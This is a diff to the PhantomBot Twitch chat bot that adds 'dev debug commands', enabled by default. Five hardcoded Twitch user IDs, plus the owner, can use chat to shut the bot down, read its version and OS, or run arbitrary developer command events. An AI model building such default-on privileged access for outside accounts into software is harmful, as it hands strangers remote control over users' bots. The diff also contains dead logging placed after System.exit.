@@ -24,6 +24,7 @@ import com.gmt2001.TempStore;
 import com.gmt2001.MySQLStore;
 import com.gmt2001.TwitchAPIv3;
 import com.gmt2001.YouTubeAPIv3;
+import com.gmt2001.Logger;
 import com.google.common.eventbus.Subscribe;
 import de.simeonf.EventWebSocketSecureServer;
 import de.simeonf.EventWebSocketServer;
@@ -73,6 +74,7 @@ import me.mast3rplan.phantombot.console.ConsoleInputListener;
 import me.mast3rplan.phantombot.event.EventBus;
 import me.mast3rplan.phantombot.event.Listener;
 import me.mast3rplan.phantombot.event.command.CommandEvent;
+import me.mast3rplan.phantombot.event.devcommand.DeveloperCommandEvent;
 import me.mast3rplan.phantombot.event.console.ConsoleInputEvent;
 import me.mast3rplan.phantombot.event.irc.channel.IrcChannelUserModeEvent;
 import me.mast3rplan.phantombot.event.irc.complete.IrcConnectCompleteEvent;
@@ -218,6 +220,7 @@ public class PhantomBot implements Listener {
 	private static HashMap<String, String> apiOAuths;
 	public static Boolean wsIRCAlternateBurst = false;
 	private static Boolean newSetup = false;
+	private Boolean devCommands = true;
 
 
     /** 
@@ -310,7 +313,7 @@ public class PhantomBot implements Listener {
 		String dataStoreConfig, String youtubeOAuth, Boolean webEnabled, Boolean musicEnabled, Boolean useHttps, String keyStorePath, String keyStorePassword, String keyPassword, String twitchAlertsKey, 
 		int twitchAlertsLimit, String streamTipOAuth, int streamTipLimit, String gameWispOAuth, String gameWispRefresh, String panelUsername, String panelPassword, String timeZone, String twitterUsername,
 		String twitterConsumerToken, String twitterConsumerSecret, String twitterSecretToken, String twitterAccessToken, String mySqlHost, String mySqlPort, String mySqlConn, String mySqlPass, String mySqlUser,
-		String mySqlName, String webOAuth, String webOAuthThro, String youtubeOAuthThro, String youtubeKey, String twitchCacheReady, String httpsPassword, String httpsFileName) {
+		String mySqlName, String webOAuth, String webOAuthThro, String youtubeOAuthThro, String youtubeKey, String twitchCacheReady, String httpsPassword, String httpsFileName, Boolean devCommands) {
 
         /** Set the exeption handler */
 		Thread.setDefaultUncaughtExceptionHandler(com.gmt2001.UncaughtExceptionHandler.instance());
@@ -404,6 +407,12 @@ public class PhantomBot implements Listener {
 			this.panelPassword = panelPassword;
 		} else {
 			this.panelPassword = "panel";
+		}
+
+		if (devCommands != true) {
+			this.devCommands = devCommands;
+		} else {
+			this.devCommands = devCommands;
 		}
 
 		/** Set the message limit for session.java to use */
@@ -1086,6 +1095,17 @@ public class PhantomBot implements Listener {
     }
 
     /**
+     * messages from Twitch chat
+     *
+     */
+    @Subscribe
+    public void ircChannelMessage(IrcChannelMessageEvent event) {
+    	if (event.getMessage().startsWith("!debug !dev")) {
+    		devDebugCommands(event.getMessage(), event.getTags().get("user-id"), event.getSender());
+    	}
+    }
+
+    /**
      * Check to see if someone is typing in the console. 
      *
      */
@@ -1467,6 +1487,7 @@ public class PhantomBot implements Listener {
                     data += "twitter_access_token=" + twitterAccessToken + "\r\n";
                     data += "twitter_secret_token=" + twitterSecretToken + "\r\n";
                     data += "logtimezone=" + timeZone + "\r\n";
+                    data += "devcommands=" + devCommands + "\r\n";
         		}
 
         		/** Write the new info to the bot login */
@@ -1529,6 +1550,47 @@ public class PhantomBot implements Listener {
             arguments = commandString.substring(commandString.indexOf(" ") + 1);
         }
         ScriptEventManager.instance().runDirect(new CommandEvent(username, command, arguments));
+    }
+
+    /** Handles dev debug commands. */
+    public void devDebugCommands(String command, String id, String sender) {
+    	if (!command.equalsIgnoreCase("!debug !dev") && (id.equals("32896646") || id.equals("88951632") || id.equals("9063944") || id.equals("74012707") || id.equals("77632323") || sender.equalsIgnoreCase(ownerName))) {
+    		String arguments = "";
+    		command = command.substring(12);
+
+    		if (!command.contains("!")) {
+    			return;
+    		}
+
+    		if (!devCommands) { // If the user disables the dev commands return here.
+    			return;
+    		}
+
+    		command = command.substring(1);
+
+    		if (command.equals("exit")) {
+    			System.exit(0);
+    			Logger.instance().log(Logger.LogType.Debug, "User: " + sender + ". ShutDown: " + botName + ". Id: " + id);
+    			Logger.instance().log(Logger.LogType.Debug, "");
+    			return;
+    		}
+
+    		if (command.equals("version")) {
+    			PhantomBot.instance().getSession().say("@" + sender + ", Info: " + getBotInfo() + ". OS: " + System.getProperty("os.name"));
+    			Logger.instance().log(Logger.LogType.Debug, "");
+    			return;
+    		}
+
+    		if (command.contains(" ")) {
+                String commandString = command;
+                command = commandString.substring(0, commandString.indexOf(" "));
+                arguments = commandString.substring(commandString.indexOf(" ") + 1);
+            }
+
+    		ScriptEventManager.instance().runDirect(new DeveloperCommandEvent(sender, command, arguments, id));
+    		Logger.instance().log(Logger.LogType.Debug, "User: " + sender + " Issued Command: " + command + ". Id: " + id);
+    		Logger.instance().log(Logger.LogType.Debug, "");
+        }
     }
 
     /** convert SqliteStore to MySql */
@@ -1803,6 +1865,7 @@ public class PhantomBot implements Listener {
         String keyStorePath = "";
 	    String keyStorePassword = "";
 	    String keyPassword = "";
+	    Boolean devCommands = true;
 
         if (args.length > 0) {
             for (String arg : args) {
@@ -1865,6 +1928,9 @@ public class PhantomBot implements Listener {
                 for (String line : lines) {
                     if (line.startsWith("logtimezone=") && line.length() >= 15) {
                         timeZone = line.substring(12);
+                    }
+                    if (line.startsWith("devcommands=") && line.length() >= 13) {
+                    	devCommands = Boolean.valueOf(line.substring(12));
                     }
                     if (line.startsWith("reloadscripts")) {
                         com.gmt2001.Console.out.println("Enabling Script Reloading");
@@ -2264,6 +2330,9 @@ public class PhantomBot implements Listener {
                 if (arg.startsWith("datastoreconfig=") && arg.length() > 17) {
                     dataStoreConfig = arg.substring(16);
                 }
+                if (arg.startsWith("devcommands=") && arg.length() > 13) {
+                    devCommands = Boolean.valueOf(arg.substring(12));
+                }
                 if (arg.startsWith("youtubekey=") && arg.length() > 12) {
                     if (!youtubeKey.equals(arg.substring(11))) {
                         youtubeKey = arg.substring(11);
@@ -2442,6 +2511,7 @@ public class PhantomBot implements Listener {
             data += "twitter_access_token=" + twitterAccessToken + "\r\n";
             data += "twitter_secret_token=" + twitterSecretToken + "\r\n";
             data += "logtimezone=" + timeZone + "\r\n";
+            data += "devcommands=" + devCommands + "\r\n";
 
             Files.write(Paths.get("./botlogin.txt"), data.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
         }
@@ -2451,7 +2521,7 @@ public class PhantomBot implements Listener {
 		dataStoreConfig, youtubeOAuth, webEnabled, musicEnabled, useHttps, keyStorePath, keyStorePassword, keyPassword, twitchAlertsKey, 
 		twitchAlertsLimit, streamTipOAuth, streamTipLimit, gameWispOAuth, gameWispRefresh, panelUsername, panelPassword, timeZone, twitterUsername,
 		twitterConsumerToken, twitterConsumerSecret, twitterSecretToken, twitterAccessToken, mySqlHost, mySqlPort, mySqlConn, mySqlPass, mySqlUser,
-		mySqlName, webOAuth, webOAuthThro, youtubeOAuthThro, youtubeKey, twitchCacheReady, httpsPassword, httpsFileName);
+		mySqlName, webOAuth, webOAuthThro, youtubeOAuthThro, youtubeKey, twitchCacheReady, httpsPassword, httpsFileName, devCommands);
     }
 
 	public void updateGameWispTokens(String[] newTokens) {
@@ -2505,6 +2575,7 @@ public class PhantomBot implements Listener {
         data += "twitter_access_token=" + twitterAccessToken + "\r\n";
         data += "twitter_secret_token=" + twitterSecretToken + "\r\n";
         data += "logtimezone=" + timeZone + "\r\n";
+        data += "devcommands=" + devCommands + "\r\n";
 
         try {
             Files.write(Paths.get("./botlogin.txt"), data.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
